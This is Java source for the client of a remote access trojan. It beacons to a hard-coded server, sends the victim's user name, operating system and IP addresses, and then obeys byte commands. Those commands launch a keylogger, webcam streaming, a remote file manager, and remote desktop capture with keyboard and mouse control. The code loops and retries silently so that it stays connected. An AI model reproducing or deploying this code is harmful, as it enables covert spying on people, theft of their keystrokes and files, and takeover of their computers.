import java.awt.Dimension;
import java.awt.HeadlessException;
import java.awt.event.WindowEvent;
//import java.io.BufferedReader;
//import java.io.File;
import java.io.IOException;
import java.io.InputStream;
//import java.io.InputStreamReader;
import java.io.OutputStream;
//import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;

import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;

import com.github.sarxos.webcam.Webcam;



//import com.maxmind.geoip2.DatabaseReader;
//import com.maxmind.geoip2.model.CityResponse;


//http://www.daniweb.com/software-development/java/threads/254810/find-the-differences-between-two-images-and-the-locations-of-the-differences/
public class JClient{
	
	private static ClientKeylogger keyloggerOfficial = null;
	
	public static void main(String[] args) throws IOException {
		

		//THIS HANDLER IS ONLY FOR THE CLIENT CONNECTION THING. GACKY RIGHT? LOL!
		Thread.setDefaultUncaughtExceptionHandler(
				new Thread.UncaughtExceptionHandler() {
					@Override public void uncaughtException(Thread t, Throwable e) {
//						System.out.println(t.getName() + "; " + e);
						if(e instanceof ArithmeticException) {
							System.out.println("commenting it!");
							run();
						} else {
							System.out.println(t.getName() + "; " + e);
							e.printStackTrace();
						}
//						System.exit(0);
//						run(); //catch it then go to run again!
					}
				});
		run();
	}
	
	//writes a string char by char to outputstream
	public static void writeStringOutStream(OutputStream out, String line) {
//		if(line == null) {
//			line = "null";
//		}
		byte[] convert = stringToByteArray(line);
		try {
			out.write(convert, 0, line.length() + 1);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	//addds newline character!
	public static byte[] stringToByteArray(String line) {
		System.out.println(line);
		byte[] temp = new byte[line.length() + 1];
		for(int i = 0; i < line.length(); i++) {
			temp[i] = (byte)line.charAt(i);
//			System.out.println(line);
		}
		temp[line.length()] = '\n';
		return temp;
	}
	
	@SuppressWarnings("resource")
	public static void run() {
			Socket mainSocket;
			while(true) {
				try {	
					mainSocket = new Socket("192.168.1.66", 7575);
					
					
					//SEND THE INFO RIGHT HERE! :o
					System.out.println(" not working!");
//					PrintWriter temp = new PrintWriter(mainSocket.getOutputStream());
//					BufferedReader rofl = new BufferedReader(new InputStreamReader(mainSocket.getInputStream()));
//					temp.print("Justin Bieber");
//					temp.print('\n');
//					byte[] love = new byte[4];
//					temp.println("JustinBieber");
					System.out.println("44444444444");

					OutputStream pw = mainSocket.getOutputStream();
//					byte[] temp2 = {(byte)2};
//					pw.write(temp2, 0, 1);
					
					//client name
					writeStringOutStream(pw, System.getProperty("user.name"));

					System.out.println("7777774");
//					File database = new File("GeoLite2-City.mmdb"); //GET THE OFFICIAL SOMEHOW!

//					DatabaseReader reader = new DatabaseReader.Builder(database).build();
//					System.out.println("ORANGE JUICE!");
//
//					CityResponse response = reader.city(InetAddress.getByName(IPChecker.getIP()));
//					System.out.println("BLUE DINOSAUR!");
					
//					temp.println("USA");
					//country
					writeStringOutStream(pw, "USA");
//					writeStringOutStream(pw, response.getCountry().getIsoCode());

//					System.out.println("COUNTRY CODE: " + response.getCountry().getIsoCode());
					
					System.out.println("STOP MOVING!!");


//					temp.println("New York City");
					
					//city
					writeStringOutStream(pw, "New York City");
//					writeStringOutStream(pw, response.getCity().getName());

					
					System.out.println("fight the DONKEY!");


//					temp.println("Linux");
					
					//os!
					writeStringOutStream(pw, System.getProperty("os.name"));

//					temp.println("134.342.33");
					
//					System.out.println("HOST NAME IS: " + InetAddress.getLocalHost().getHostName());
					//internal IP
					writeStringOutStream(pw, InetAddress.getLocalHost().getHostAddress());

//					temp.println("435.344.23");
					//external IP
					writeStringOutStream(pw, IPChecker.getIP());
					
					writeStringOutStream(pw, "end");


//					temp.println("end");
					
					System.out.println("BOBBBAFETT!");
					
				    //create new thread ClientConnectionChecker that checks continuously
					new Thread(new ClientConnectionChecker(mainSocket)).start();
					break; //as soon as you get connection, you break out of this while loop.
				} catch(Exception e) {
//					e.printStackTrace();
//					System.exit(0);
					System.out.println("Waiting for server to come online!");
					//MAKE THIS THREAD SLEEP AND THEN CHECK CONNECTION.
					//NO NEED TO CONSTANTLY CHECK EVERY SECOND. :)
					try {
						Thread.sleep(60000); //SLEEP FOR 1 MINUTE! :)
						//UNTIL CHECK FOR CONNECTION AGAIN! :o
					} catch (InterruptedException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
				}
			}
//			new Thread(new ClientConnectionChecker(mainSocket)).start();

//			try {
//				Thread thread1 = new Thread(new ClientConnectionChecker(mainSocket));
//				thread1.start();
//				while(true) {
////					System.out.println("ZOMBIE STOPPER");
//				}
//			} catch (ArithmeticException e) {
//				System.out.println("I'M NOT READY!!");
//				System.exit(0);
//			}
//		    ClientConnectionChecker checker = new ClientConnectionChecker(mainSocket);
		while(true) {
			Socket commandSocket = null;
			try {
				//Creates a socket to receive commands from!
			    commandSocket = new Socket("192.168.1.66", 7575);
			    
			    System.out.println("FUBASGAG");
			    //create new thread ClientConnectionChecker that checks continuously
//			    ClientConnectionChecker checker = new ClientConnectionChecker(socket);
			    System.out.println("Fasdfsafadsfasdf");

//			    ExecutorService threadExecutor = Executors.newSingleThreadExecutor();
			    System.out.println("#$#$#$");

//			    threadExecutor.submit(checker).get(); //starts checker in a new thread
			    
			    System.out.println("STOP ROLLING");
//			    System.exit(0);
				InputStream in = commandSocket.getInputStream();
				
				System.out.println("WALLET WALLET WLLET");
				while(true) {
//					System.out.println("BORED TO DEATH");
					byte[] temp = new byte[1];
					//reads whatever command and determines what to do.
//					System.out.println("LOVE YOU SO!");
					in.read(temp, 0, 1);
//					System.out.println(YOU SOUL WHAT'S READ: " + temp[0]);
//						System.out.println("Command is: " + command);
					if(temp[0] == (byte)5) { //KEYLOGGER :o
						System.out.println("MAN I'M IN HERE!");
						while (true) {
							try {
								Socket keylogger = new Socket("192.168.1.66",7575);
								writeStringOutStream(keylogger.getOutputStream(),"keylogger");
								if(keyloggerOfficial == null) {
									ClientKeylogger key = new ClientKeylogger(keylogger.getOutputStream());
									keyloggerOfficial = key;
								} else {
									//give it a new out :P haha.
									keyloggerOfficial.out = keylogger.getOutputStream();
								}
//								if(keyloggerOfficial == null) {
//									keyloggerOfficial = key;
//								} else {
//									//tell it to close itself
//					    			keyloggerOfficial.dispatchEvent(new WindowEvent(keyloggerOfficial, WindowEvent.WINDOW_CLOSED));
//					    			keyloggerOfficial = null; //reset it to null
//								}
								break;
							} catch (Exception e) {
								e.printStackTrace();
							}
						}
					}
					if(temp[0] == (byte)4) { //WEBCAM ! :o
						outerloop:
						while(true) {
						try{
							Socket webcamScreenSocket = new Socket("192.168.1.66", 7575);
							writeStringOutStream(webcamScreenSocket.getOutputStream(), "webcamScreen");
							ClientWebcam webcam = new ClientWebcam(webcamScreenSocket.getOutputStream(), 200);
							while(true) {
								try {
									Socket webcamFrameRate = new Socket("192.168.1.66", 7575);
									writeStringOutStream(webcamFrameRate.getOutputStream(), "webcamFrameRate");
									new WebcamFrameDelayDetector(webcamFrameRate.getInputStream(), webcam);
//									new ClientFileManager(fileManagerCommandSocket, fileManagerDataSocket);
									System.out.println("SOOTHE THE SON !");
									break outerloop;
								} catch(Exception e) {
									
								}
							}
						} catch(Exception e) {
							
						}
						}
						
					}
					//NEVER HAVE ONE BE ZERO NEVER! 1 OR ABOVE!
					//MEANS FILES !!!
					if(temp[0] == (byte)3) {
						
						outerloop:
						while(true) {
						try{
						Socket fileManagerCommandSocket = new Socket("192.168.1.66", 7575);
						writeStringOutStream(fileManagerCommandSocket.getOutputStream(), "fileManagerCommand");
							while(true) {
								try {
									Socket fileManagerDataSocket = new Socket("192.168.1.66", 7575);
									writeStringOutStream(fileManagerDataSocket.getOutputStream(), "fileManagerData");
									new ClientFileManager(fileManagerCommandSocket, fileManagerDataSocket);
									System.out.println("FIVE GUYS !");
									break outerloop;
								} catch(Exception e) {
									
								}
							}
						} catch(Exception e) {
							
						}
						}
					}
					if(temp[0] == (byte)2) {
						System.out.println("WHAT'S GOING ON?");
						//A DataOutputStream can write ints, longs and other primitive data types.
						//A BufferedOutputStream can just buffer a bunch of bytes. One stream can do
						//things the other can't and vice versa. Wrapping them (in the correct order) offers
						//you all the functionality, i.e. you can write ints, longs and other primitive data
						//types to a buffered stream.
						outerloop:
						while(true) {
////							System.out.println("STOPPAGE TIME");
//							byte[] bytes;
////							System.out.println("Available: " + in.available());
//							if(in.available() > 0) { //so if something was sent. quit.
//								break; //it means something was sent. 
//							} else { //else nothing was sent. so keep sending images!
//								image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
////								JFrame frame = new JFrame();
//////								frame.getContentPane().setLayout(new FlowLayout());
////								frame.getContentPane().add(new JLabel(new ImageIcon(image)));
////								frame.setVisible(true);
////								while(true) {
////									
////								}
//								baos = new ByteArrayOutputStream();
//								ImageIO.write(image, "jpeg", baos);
//							}
//							bytes = baos.toByteArray(); //convert byte stream to byte array
//							System.out.println("BYTE ARRAY LENGTH: " + bytes.length);
//							bundle.writeInt(bytes.length);
//							bundle.write(bytes);
							while(true) {
								try {
									Socket sock = new Socket("192.168.1.66", 7575);
									writeStringOutStream(sock.getOutputStream(), "remoteDesktopScreen");
//									Thread clientScreen = new ClientScreen(sock, 0);
									ClientScreen cs = new ClientScreen(sock, 200);
//									ClientScreen cs = new ClientScreen(sock, 0);
									while(true) {
										try {
											Socket frameRateSocket = new Socket("192.168.1.66", 7575);
											writeStringOutStream(frameRateSocket.getOutputStream(), "remoteDesktopFrameRate"); 
											new RemoteDesktopFrameDelayDetector(frameRateSocket.getInputStream(), cs);
											break;
										}catch(Exception e) {
											e.printStackTrace();
										}	
									}
//									love.join();
									while(true) {
										try { //THIS SOCKET IS FOR REMOTE CONTROL!
											Socket sock1 = new Socket("192.168.1.66", 7575);
											writeStringOutStream(sock1.getOutputStream(), "remoteDesktopControl");
											//do the robot stuff in a new thread
//											Thread keyMouseExecutor = new KeyMouseExecutor(sock1.getInputStream());
											new KeyMouseExecutor(sock1.getInputStream());
											System.out.println("BILL GATES CAN SUCK MY NUTS");
											break outerloop;

//											while(true) {
//												System.out.println("MAZEMAZEMAZEMAZEMAZEMAZEMAZEMAZE");
//												if(in.available() > 0) { //so if something was sent. quit.
//													in.read(temp, 0, 1); //to get available back to 0
//													//interrupt both thread love and of remote control socket thread! 
////													clientScreen.interrupt();
//													//INTERRUPT THE OTHER THREAD WHICH YOU NEED TO CREATE.
//													
//													//WHY YOU DON'T NEED TO INTERRUPT? IT'S BECAUSE WHEN SOCKETS ARE CLOSED ON
//													//SERVER SIDE, ALL THREADS WILL GO THROW AN EXCEPTION
//													//BECAUSE SOCKETS ARE CLOSED AND WILL BE CAUGHT IN THE CATCH
//													//WHICH WILL END BOTH RESPECTIVE THREADS!
//													
//													//FUCK IT JUST CLOSE THE SOCKETS RIGHT HERE FUCK THIS SHIT
//													sock.close();
//													sock1.close();
////													keyMouseExecutor.interrupt();
//													quit = true;
//													break;
//												}
//												try {
//													Thread.sleep(100);
//												} catch (InterruptedException e) {
//													// TODO Auto-generated catch block
////													e.printStackTrace();
//												}
//											}
										} catch(IOException e) {
											System.out.println("Keep rolling");
										}
									}
								} catch(IOException e) {
									System.out.println("keep trying");
								}
							}
//							love.start();
						}
					}
//					System.out.println("STOPPP??????");

//					System.out.println("in here forever BRO!!!");
				}
				
			} 
//			catch(ExecutionException e) {
//				if(e.getMessage().contains("Server has disconnected. Connection lost.")) {
//					System.out.println("Connection lost. Looking for server!");
////					System.exit(0);
//				}
//				//QUIT THAT!
//			}catch(InterruptedException e) {
//				//idk what to do
//			} 
			catch(UnknownHostException e) {
				//idk what U DOING HERE FOR to do here
			} catch(IOException e) {
				System.out.println("Waiting for server to come online!");
//				socket.close();
			} catch (HeadlessException e) {
				// TODO Auto-generated catch block
//				e.printStackTrace();
			} 
//			catch (InterruptedException e) {
//				// TODO Auto-generated catch block
//				e.printStackTrace();
//			} 
//			catch (AWTException e) {
//				// TODO Auto-generated catch block
//				e.printStackTrace();
//			} 
			finally {
				if(commandSocket != null)
					try {
						commandSocket.close();
					} catch (IOException e) {
						// TODO Auto-generated catch block
//						e.printStackTrace();
					}
			}
		} 	
	}

}


